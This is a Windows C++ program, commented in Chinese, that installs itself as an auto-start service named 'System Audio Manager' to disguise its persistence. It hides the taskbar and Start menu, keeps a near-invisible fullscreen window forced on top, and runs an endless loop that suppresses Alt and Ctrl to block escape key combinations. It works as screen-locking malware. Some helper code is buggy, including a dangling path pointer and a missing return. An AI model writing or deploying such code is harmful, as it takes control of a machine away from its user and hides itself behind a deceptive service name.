#include <iostream>
#include <windows.h>
#include <thread>
#include <string>
#include <unistd.h>

using namespace std;
 
//获取当前exe程序所在路径
char *GetExeFullPath()
{
	char path[256];
	string pathstr,exefilename,strtmp;
    getcwd(path, 256);
	strtmp.assign(path,strlen(path));
    exefilename = "ProjectBoundarySteam.exe";
 	pathstr = strtmp + "\\" + exefilename;
 	char * pathrtn=(char*)pathstr.data();
	return pathrtn;
}
 
//测试创建、启动系统服务
bool TestStartService()
{
	//打开服务控制管理器
	SC_HANDLE hScm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	if (hScm == NULL)
	{
		return false;
	}
	//创建系统服务，参数很多，可查看帮助文档
	SC_HANDLE hService = CreateService(hScm, "System Audio Manager", "System Audio Manager", SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, GetExeFullPath(), 
		NULL, NULL, "", NULL, "");
	if (hService == NULL)
	{
		return false;
	}
	//启动系统服务
	if (StartService(hService, 0, NULL) == false)
	{
		return false;
	}
	//释放句柄
	CloseServiceHandle(hScm);
	CloseServiceHandle(hService);
	return true;
}
 
//测试停止、卸载系统服务
bool TestStopService()
{
	//获取系统服务控制管理器句柄
	SC_HANDLE hScm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hScm == NULL)
	{
		return false;
	}
	//打开系统服务，获取服务句柄
	SC_HANDLE hService = OpenService(hScm, "System Audio Manager", SERVICE_ALL_ACCESS);
	if (hService == NULL)
	{
		return false;
	}
	//查询该系统服务是否正在运行，若在运行中则停止该服务
	SERVICE_STATUS status;
	QueryServiceStatus(hService, &status);
	if (status.dwCurrentState == SERVICE_RUNNING)
	{
		ControlService(hService, SERVICE_CONTROL_STOP, &status);
		//如果出错，则返回false
		if (status.dwCurrentState != NO_ERROR)
		{
			return false;
		}
	}
	//如果服务状态为已停止，则卸载该系统服务
	if (status.dwCurrentState == SERVICE_STOPPED)
	{
		DeleteService(hService);
	}
	//释放句柄
	CloseServiceHandle(hScm);
	CloseServiceHandle(hService);
}

void kbd_lock()
{
	while(1)
	{
		keybd_event(VK_MENU,0x45,KEYEVENTF_KEYUP,0);
		keybd_event(VK_LCONTROL,0x45,KEYEVENTF_KEYUP,0);
		keybd_event(VK_RCONTROL,0x45,KEYEVENTF_KEYUP,0);
		Sleep(10); 
	}
}

void topmost()
{
	while(1)
	{
		int cX = GetSystemMetrics(SM_CXSCREEN);   
		int cY = GetSystemMetrics(SM_CYSCREEN);
		HWND stw = FindWindow("Shell_TrayWnd",NULL); 
		HWND m = FindWindow("Windows.UI.Core.CoreWindow","启动");//开始菜单 
		SetWindowPos(stw,HWND_BOTTOM,0,0,cX,cY,SWP_HIDEWINDOW|SWP_NOOWNERZORDER|SWP_NOACTIVATE|SWP_NOSIZE|SWP_NOMOVE);
		SetWindowPos(m,HWND_BOTTOM,0,0,cX,cY,SWP_HIDEWINDOW|SWP_NOOWNERZORDER|SWP_NOACTIVATE|SWP_NOSIZE|SWP_NOMOVE);
		HWND top = FindWindow("UnrealClass","Boundary");
		HWND foreground = GetForegroundWindow();
		if(top!=foreground){
			SetWindowPos(top,HWND_TOPMOST,0,0,cX,cY,SWP_SHOWWINDOW|SWP_NOACTIVATE|SWP_NOSIZE|SWP_NOMOVE);
		}
		SetFocus(top);
		Sleep(10); 
	}
}
/* This is where all the input to the window goes to */
LRESULT CALLBACK WndProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam) {
	switch(Message) {
		
		/* Upon destruction, tell the main thread to stop */
		case WM_DESTROY: {
			break;
		}
		
		/* All other messages (a lot of them) are processed using default procedures */
		default:
			return DefWindowProc(hwnd, Message, wParam, lParam);
	}
	return 0;
}

/* The 'main' function of Win32 GUI programs: this is where execution starts */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	WNDCLASSEX wc; /* A properties struct of our window */
	HWND hwnd; /* A 'HANDLE', hence the H, or a pointer to our window */
	MSG msg; /* A temporary location for all messages */

	bool TestStartService();
	bool TestStopService();
	void kbd_lock();
	void topmost();

	/* zero out the struct and set the stuff we want to modify */
	memset(&wc,0,sizeof(wc));
	wc.cbSize		 = sizeof(WNDCLASSEX);
	wc.lpfnWndProc	 = WndProc; /* This is where we will send messages to */
	wc.hInstance	 = hInstance;
	wc.hCursor		 = LoadCursor(NULL, IDC_ARROW);
	
	/* White, COLOR_WINDOW is just a #define for a system color, try Ctrl+Clicking it */
	wc.hbrBackground = (HBRUSH)CreateSolidBrush(RGB(71,204,255));
	wc.lpszClassName = "UnrealClass";
	wc.hIcon		 = LoadIcon(NULL, IDI_APPLICATION); /* Load a standard icon */
	wc.hIconSm		 = LoadIcon(NULL, IDI_APPLICATION); /* use the name "A" to use the project icon */

	if(!RegisterClassEx(&wc)) {
		MessageBox(NULL, "Window Registration Failed!","Error!",MB_ICONEXCLAMATION|MB_OK);
		return 0;
	}
	
	int cX = GetSystemMetrics(SM_CXSCREEN);   
	int cY = GetSystemMetrics(SM_CYSCREEN);

	hwnd = CreateWindowEx(WS_EX_CLIENTEDGE,"UnrealClass","Boundary",WS_VISIBLE|WS_POPUP|WS_CLIPSIBLINGS,
		CW_USEDEFAULT, /* x */
		CW_USEDEFAULT, /* y */
		cX, /* width */
		cY, /* height */
		NULL,NULL,hInstance,NULL);

	if(hwnd == NULL) {
		MessageBox(NULL, "Window Creation Failed!","Error!",MB_ICONEXCLAMATION|MB_OK);
		return 0;
	}
	
	SetWindowLong(hwnd,GWL_EXSTYLE,GetWindowLong(hwnd,GWL_EXSTYLE)^0x80000);      
    HINSTANCE  hInst = LoadLibrary("User32.DLL");    
    if(hInst != NULL)  
    {  
        typedef BOOL (WINAPI *MYFUNC)(HWND, COLORREF, BYTE, DWORD);   
          
        MYFUNC pFunc = (MYFUNC)GetProcAddress(hInst, "SetLayeredWindowAttributes");  
        if (pFunc != NULL){
               pFunc(hwnd, 0,25, 2);    
        	}  
        FreeLibrary(hInst);  
        hInst = NULL;  
    }
    TestStartService();	
    EnableWindow(hwnd,false);
    thread topmst(topmost);
    topmst.detach();
    thread kbd(kbd_lock);
	kbd.detach();
	/*
		This is the heart of our program where all input is processed and 
		sent to WndProc. Note that GetMessage blocks code flow until it receives something, so
		this loop will not produce unreasonably high CPU usage
	*/
	while(GetMessage(&msg, NULL, 0, 0) > 0) { /* If no error is received... */
		TranslateMessage(&msg); /* Translate key codes to chars if present */
		DispatchMessage(&msg); /* Send it to WndProc */
	}
	return msg.wParam;
}
